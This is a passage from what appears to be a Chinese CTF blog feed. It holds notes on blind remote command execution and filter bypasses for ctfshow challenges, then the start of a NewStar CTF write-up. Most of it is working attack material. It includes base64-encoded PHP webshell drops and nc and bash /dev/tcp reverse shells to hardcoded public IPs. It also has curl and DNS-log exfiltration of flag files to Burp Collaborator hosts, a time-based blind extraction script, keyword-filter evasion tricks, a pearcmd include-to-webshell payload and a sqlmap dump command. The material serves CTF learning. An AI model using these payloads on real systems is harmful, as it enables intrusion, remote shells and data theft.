class="code"><pre><span class="line"><span class="language-xml">echo &#x27;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B&#x27; | base64 -d &gt; 123.php</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(\<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; /var/www/html/basic/web/2.php</span></span><br></pre></td></tr></table></figure><h3 id="4-无回显RCE">4.无回显RCE</h3><h4 id="4-1反弹shell">4.1反弹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nc 150.158.24.228 150 -e /bin/sh</span><br><span class="line">bash -c \&quot;bash -i &gt;&amp; /dev/tcp/150.158.24.228/150 0&gt;&amp;1\&quot;</span><br><span class="line"></span><br><span class="line">nc 110.41.17.183 150 -e /bin/sh</span><br><span class="line">bash -c \&quot;bash -i &gt;&amp; /dev/tcp/110.41.17.183/250 0&gt;&amp;1\&quot;</span><br><span class="line"></span><br><span class="line">java版本,用的时候记得把命令<span class="built_in">base64</span>编码</span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,bash -i &gt;&amp; /dev/tcp/110.41.17.183/250 0&gt;&amp;1&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzI1MCAwPiYx&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">在浏览器命令执行的时候切记需要进行url后传参</span><br><span class="line"></span><br><span class="line">msf反弹shell，详见另一篇0xGame WEEK4最后一题</span><br></pre></td></tr></table></figure><h4 id="4-2直接写入">4.2直接写入</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">利用<span class="built_in">cp</span>命令：<span class="built_in">cp</span> flag.php <span class="number">1</span>.txt</span><br><span class="line"></span><br><span class="line">利用<span class="built_in">mv</span>命令：<span class="built_in">mv</span> flag.php <span class="number">1</span>.txt</span><br><span class="line"></span><br><span class="line">利用&gt;输出结果到文件：<span class="built_in">ls</span> &gt; <span class="number">1</span>.txt</span><br><span class="line"></span><br><span class="line">利用<span class="built_in">wget</span>下载：<span class="built_in">wget</span> http://ip/shell.txt &gt; shell.php或者<span class="built_in">wget</span> http://ip/shell.txt <span class="literal">-O</span> shell.php</span><br></pre></td></tr></table></figure><h4 id="4-3burp-Collaborator-Client">4.3burp(Collaborator Client)</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用bp的Collaborator <span class="built_in">Client</span>模块进行操作</span><br><span class="line"></span><br><span class="line">curl -X POST -F xx=@/flag http:<span class="comment">//qvpx2nspeuaw3w0lqulk72nyspysmh.oastify.com</span></span><br></pre></td></tr></table></figure><h4 id="4-4数据外带dnslog">4.4数据外带dnslog</h4><p>推荐俩网址：</p><p>1.<a href="http://dnslog.cn">http://dnslog.cn</a></p><p>2.<a href="http://ceye.io/">http://ceye.io/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">单行传输：</span><br><span class="line">ping `<span class="built_in">whoami</span>`.dns地址</span><br><span class="line">curl http://dns地址/`<span class="built_in">whoami</span>`</span><br><span class="line"></span><br><span class="line">多行传输：(外带只会显示第一行的数据)</span><br><span class="line">curl http://dns地址/`<span class="built_in">whoami</span> | <span class="built_in">base64</span>`</span><br><span class="line">curl http://dns地址/`<span class="built_in">whoami</span> | sed -n <span class="string">&#x27;2p&#x27;</span>`</span><br></pre></td></tr></table></figure><h4 id="4-5盲注">4.5盲注</h4><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="built_in">string</span></span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://localhost.test.php/?c=&#x27;</span></span><br><span class="line">dic=<span class="built_in">string</span>.printable[:<span class="number">-6</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    judge=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        now=f<span class="string">&#x27;&#123;url&#125;a=$(cat /flag | head -1 | cut -b &#123;i&#125;);if [ $a = &#123;j&#125; ];then sleep 2;fi&#x27;</span></span><br><span class="line">        start=<span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">        r=requests.get(now)</span><br><span class="line">        <span class="keyword">end</span>=<span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">        <span class="keyword">if</span> int(<span class="keyword">end</span>)-int(start) &gt;<span class="number">1</span>:</span><br><span class="line">            judge=<span class="number">1</span></span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> judge==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>命令解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ `<span class="built_in">cat</span> /flag | awk NR==1 | <span class="built_in">cut</span> -c %s` == %s ];<span class="keyword">then</span> <span class="built_in">sleep</span> 2;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h3 id="5-绕过长度限制">5.绕过长度限制</h3><h4 id="5-1substr-函数截取">5.1substr()函数截取</h4><h5 id="5-1-1-web133">5.1.1 web133</h5><p><strong>源代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>分析</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">get传参   F=<span class="string">`$F `</span>; <span class="keyword">sleep</span> <span class="number">3</span></span><br><span class="line">经过<span class="keyword">substr</span>($F,<span class="number">0</span>,<span class="number">6</span>)截取后 得到  <span class="string">`$F `</span>;</span><br><span class="line">也就是会执行 <span class="keyword">eval</span>(<span class="string">&quot;`$F `;&quot;</span>);</span><br><span class="line">我们把原来的$F带进去</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;``$F `;sleep 3`&quot;</span>);</span><br><span class="line">也就是说最终会执行  <span class="string">` `</span>$F <span class="string">`;sleep 3 `</span> == shell_exec(<span class="string">&quot;`$F `; sleep 3&quot;</span>);</span><br><span class="line">前面的命令我们不需要管，但是后面的命令我们可以自由控制。</span><br><span class="line">这样就在服务器上成功执行了 <span class="keyword">sleep</span> <span class="number">3</span></span><br><span class="line">所以 最后就是一道无回显的RCE题目了</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: ?F=`<span class="variable">$F</span>`; curl -X POST -F xx=@flag.php http:<span class="regexp">//</span>juhspnhonkrsc5p0qayb5lgbi2osch.burpcollaborator.net</span><br><span class="line"><span class="regexp">//</span>后面的这个是用burpsuite生成的</span><br></pre></td></tr></table></figure><h5 id="5-1-2-web134">5.1.2 web134</h5><p><strong>源代码</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error<span class="constructor">_reporting(0)</span>;</span><br><span class="line">highlight<span class="constructor">_file(<span class="params">__FILE__</span>)</span>;</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($F = @$_GET<span class="literal">[&#x27;F&#x27;]</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg<span class="constructor">_match(&#x27;<span class="operator">/</span><span class="params">system</span>|<span class="params">nc</span>|<span class="params">wget</span>|<span class="params">exec</span>|<span class="params">passthru</span>|<span class="params">bash</span>|<span class="params">sh</span>|<span class="params">netcat</span>|<span class="params">curl</span>|<span class="params">cat</span>|<span class="params">grep</span>|<span class="params">tac</span>|<span class="params">more</span>|<span class="params">od</span>|<span class="params">sort</span>|<span class="params">tail</span>|<span class="params">less</span>|<span class="params">base64</span>|<span class="params">rev</span>|<span class="params">cut</span>|<span class="params">od</span>|<span class="params">strings</span>|<span class="params">tailf</span>|<span class="params">head</span><span class="operator">/</span><span class="params">i</span>&#x27;, $F)</span>)&#123;</span><br><span class="line">        eval(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">payload:</span>F=`$F `; nl f*&gt;<span class="number">1</span>.txt</span><br><span class="line"><span class="title">payload:</span>F=`$F `; cp f* <span class="number">2</span>.txt</span><br><span class="line"></span><br><span class="line">//注意，这里的<span class="comment">;号和后面命令中间必须有个空格，没有执行不了，不知道为啥</span></span><br></pre></td></tr></table></figure><h4 id="5-2单纯长度限制">5.2单纯长度限制</h4><h5 id="5-2-1-通过-来创建文件">5.2.1 通过&gt;来创建文件</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;flag.txt    <span class="regexp">//</span>创建文件flag.txt</span><br></pre></td></tr></table></figure><h5 id="5-2-2-通过-将命令结果存入文件中">5.2.2 通过&gt;将命令结果存入文件中</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbY2h1MF0pOyA/Pg==&quot;</span> <span class="string">| base64 -d &gt; flag.php</span></span><br><span class="line"><span class="comment">//将马写入flag.php，写shell必须得用这个</span></span><br></pre></td></tr></table></figure><h5 id="5-2-3-符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容">5.2.3 &gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello hacker&quot;</span> &gt;&gt; flag.txt</span><br></pre></td></tr></table></figure><h3 id="6-命令绕过">6.命令绕过</h3><h4 id="6-1空格">6.1空格</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IFS</span>              </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;                      ——这里把，替换成了空格键</span><br><span class="line"></span><br><span class="line">%<span class="number">20</span>                                 ——代表space键</span><br><span class="line"></span><br><span class="line">%<span class="number">09</span>      <span class="literal">--</span>  需要php环境，如<span class="built_in">cat</span>%<span class="number">09</span>flag.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$</span>&#123;IFS&#125;<span class="literal">--</span>  单纯<span class="built_in">cat</span><span class="variable">$IFS2</span>,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名，如<span class="built_in">cat</span><span class="variable">$</span>&#123;IFS2&#125;flag.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$9</span><span class="literal">--</span>  后面加个<span class="variable">$</span>与&#123;&#125;类似，起截断作用，<span class="variable">$9</span>是当前系统shell进程第九个参数持有者，始终为空字符串，如<span class="built_in">cat</span><span class="variable">$IFS2</span><span class="variable">$9flag</span>.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;  <span class="literal">--</span>  重定向，如<span class="built_in">cat</span>&lt;flag.php</span><br><span class="line"></span><br><span class="line">&lt;&gt;      <span class="literal">--</span>   重定向，如<span class="built_in">cat</span>&lt;&gt;flag.php</span><br></pre></td></tr></table></figure><h4 id="6-2字符串拼接">6.2字符串拼接</h4><p>前提：能够执行系统命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?<span class="attribute">a</span>=content1;b=content2;cat <span class="variable">$b</span></span><br><span class="line">POST：</span><br><span class="line"><span class="attribute">chu0</span>=a=l;b=s;c=/;$a$b <span class="variable">$c</span></span><br></pre></td></tr></table></figure><h4 id="6-3base64编码绕过">6.3base64编码绕过</h4><p>前提：能够执行系统命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> MTIzCg==|<span class="built_in">base64</span> -d 其将会打印123</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d | bash </span><br><span class="line">`<span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d`                   ==&gt;<span class="built_in">ls</span> /</span><br><span class="line"><span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d | sh</span><br></pre></td></tr></table></figure><h4 id="6-4hex编码绕过">6.4hex编码绕过</h4><p>生成脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>);  <span class="comment">//6c73202f</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">6</span>c73202f | <span class="type">xxd</span> -r -p | <span class="type">bash</span></span><br><span class="line">`echo <span class="number">6</span>c73 | <span class="type">xxd</span> -r -p`</span><br><span class="line">echo `<span class="number">6</span>c73202f` | <span class="type">xxd</span> -r -p | <span class="type">sh</span> &gt; <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><h4 id="6-5单引号和双引号绕过">6.5单引号和双引号绕过</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca<span class="string">&#x27;&#x27;</span>t <span class="built_in">flag</span> </span><br><span class="line">ca<span class="string">&quot;&quot;</span>t <span class="built_in">flag</span></span><br><span class="line">l<span class="string">&#x27;&#x27;</span>s /</span><br><span class="line">l<span class="string">&quot;&quot;</span>s /</span><br></pre></td></tr></table></figure><h4 id="6-6反斜杠绕过">6.6反斜杠绕过</h4><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l<span class="string">\s</span> /</span><br><span class="line">l<span class="string">\s</span> /<span class="keyword">var</span>/www/ht<span class="string">\ml</span></span><br><span class="line">ca<span class="string">\t</span> f<span class="string">\ag</span></span><br></pre></td></tr></table></figure><h4 id="6-7绕过ip中的句点">6.7绕过ip中的句点</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">网络地址可以转换成数字地址，比如<span class="number">127.0</span>.<span class="number">0.1</span>可以转化为<span class="number">2130706433</span>。</span><br><span class="line">可以直接访问http:<span class="regexp">//</span><span class="number">2130706433</span>或者http:<span class="regexp">//</span><span class="number">0</span>x7F000001，这样就可以绕过.的ip过滤。</span><br></pre></td></tr></table></figure><p><a href="http://www.msxindl.com/tools/ip/ip_num.asp">数字转ip地址</a> <a href="http://www.msxindl.com/tools/ip/ip_num.asp">ip地址转数字</a> <a href="http://www.msxindl.com/tools/ip/ip_num.asp">域名转数字ip</a></p><h4 id="6-8tee、script命令">6.8tee、script命令</h4><p><strong>ctfshow web136</strong></p><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>命令说明</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tee file1 file2 <span class="regexp">//</span>复制文件</span><br><span class="line">ls|tee <span class="number">1</span>.txt <span class="regexp">//</span>命令输出</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="built_in">cat</span> /f149_15_h3r3|<span class="built_in">tee</span> 1</span><br><span class="line">?c=<span class="built_in">cat</span> /f149_15_h3r3|script 1</span><br></pre></td></tr></table></figure><h4 id="6-9call-user-function">6.9call_user_function()</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php文档解析：https:<span class="regexp">//</span>www.php.net<span class="regexp">/manual/</span>zh/<span class="keyword">function</span>.call-user-<span class="keyword">func</span>.php</span><br></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">方式一：</span><br><span class="line">call<span class="constructor">_user_func(<span class="params">ctfshow</span>::<span class="params">getflag</span>)</span>;  <span class="comment">//引用静态参数</span></span><br><span class="line"></span><br><span class="line">方式二：</span><br><span class="line">call_user_func函数里面可以传数组，第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用</span><br><span class="line">call<span class="constructor">_user_func(<span class="params">array</span>($<span class="params">classname</span>, &#x27;<span class="params">say_hello</span>&#x27;)</span>);</span><br><span class="line">调用classname这个类里的sya_hello方法</span><br></pre></td></tr></table></figure><h4 id="6-10三目运算符">6.10三目运算符</h4><p><strong>注意，在构造三目运算符的时候，要把?和:放在同一个变量当中</strong></p><p><strong>ctfshow web145</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br><span class="line"></span><br><span class="line">v1=<span class="number">1</span>&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5):&amp;v2=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> ?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5): <span class="number">1</span>  <span class="comment">//格式是这个样子的</span></span><br></pre></td></tr></table></figure><h4 id="6-11等号和位运算">6.11等号和位运算</h4><p><strong>ctfshow web146</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);</span><br><span class="line"></span><br><span class="line">(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)</span><br></pre></td></tr></table></figure><h4 id="6-12正则匹配">6.12正则匹配</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line"><span class="built_in">ls</span> flag  =&gt;   <span class="built_in">ls</span> [e-g]lag</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">整理的笔记</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="笔记" scheme="https://bowuchuling.github.io/categories/CTF/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="笔记" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>NewStar CTF WEEK 3</title>
    <link href="https://bowuchuling.github.io/posts/fcr7dhw7.html"/>
    <id>https://bowuchuling.github.io/posts/fcr7dhw7.html</id>
    <published>2023-10-17T02:57:26.640Z</published>
    <updated>2023-10-17T03:01:02.405Z</updated>
    
    <content type="html"><![CDATA[<h1>NewStar CTF WEEK3</h1><h2 id="Include-🍐">Include 🍐</h2><p>pearcmd文件包含，用bp发包防止payload被编码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+<span class="regexp">/&amp;file=/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>lib<span class="regexp">/php/</span>pearcmd&amp;<span class="regexp">/&lt;?=eval($_POST[1]);?&gt;+/</span>tmp/chuling2.php</span><br></pre></td></tr></table></figure><p>最终exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET：</span><br><span class="line">?<span class="attribute">file</span>=/tmp/chuling2</span><br><span class="line">POST:</span><br><span class="line"><span class="attribute">1</span>=phpinfo();</span><br></pre></td></tr></table></figure><p>后面就是命令执行了</p><h2 id="medium-sql">medium_sql</h2><p>sqlmap一把梭，时间盲注</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u url/?<span class="built_in">id</span>= -p <span class="built_in">id</span> -D ctf -T here_is_flag -C flag <span class="comment">--dump --batch</span></span><br></pre></td></tr></table></figure><h2 id="POP-Gadget">POP Gadget</h2><p>简单的pop链</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 